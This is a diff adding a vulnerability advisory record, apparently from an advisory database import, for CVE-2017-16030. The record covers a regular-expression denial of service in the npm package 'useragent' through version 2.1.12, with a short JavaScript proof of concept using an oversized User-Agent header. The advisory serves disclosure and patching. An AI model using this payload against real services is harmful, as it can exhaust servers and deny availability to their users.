@@ -1,0 +1,45 @@
+advisory_id: GHSA-pjmx-9xr3-82qr
+datasource_id: github_osv_importer_v2/GHSA-pjmx-9xr3-82qr
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2018/07/GHSA-pjmx-9xr3-82qr/GHSA-pjmx-9xr3-82qr.json
+aliases:
+  - CVE-2017-16030
+summary: |
+  ReDoS via long UserAgent header in useragent
+  Affected versions of `useragent` are vulnerable to regular expression denial of service when an arbitrarily long `User-Agent` header is parsed.
+
+
+  ## Proof of Concept
+  ```js
+  var useragent = require('useragent');
+
+  var badUserAgent = 'MSIE 0.0'+Array(900000).join('0')+'XBLWP';
+  var request = 'GET / HTTP/1.1\r\nUser-Agent: ' + badUserAgent + '\r\n\r\n';
+  console.log(useragent.parse(request));
+  ```
+
+
+  ## Recommendation
+
+  Update to version 2.1.13 or later.
+impacted_packages:
+  - purl: pkg:npm/useragent
+    affected_versions: vers:npm/<=2.1.12
+    fixed_versions: vers:npm/2.1.13
+severities:
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url:
+weaknesses:
+  - CWE-400
+references:
+  - url: https://github.com/advisories/GHSA-pjmx-9xr3-82qr
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2017-16030
+    reference_type:
+    reference_id:
+  - url: https://www.npmjs.com/advisories/312
+    reference_type:
+    reference_id:
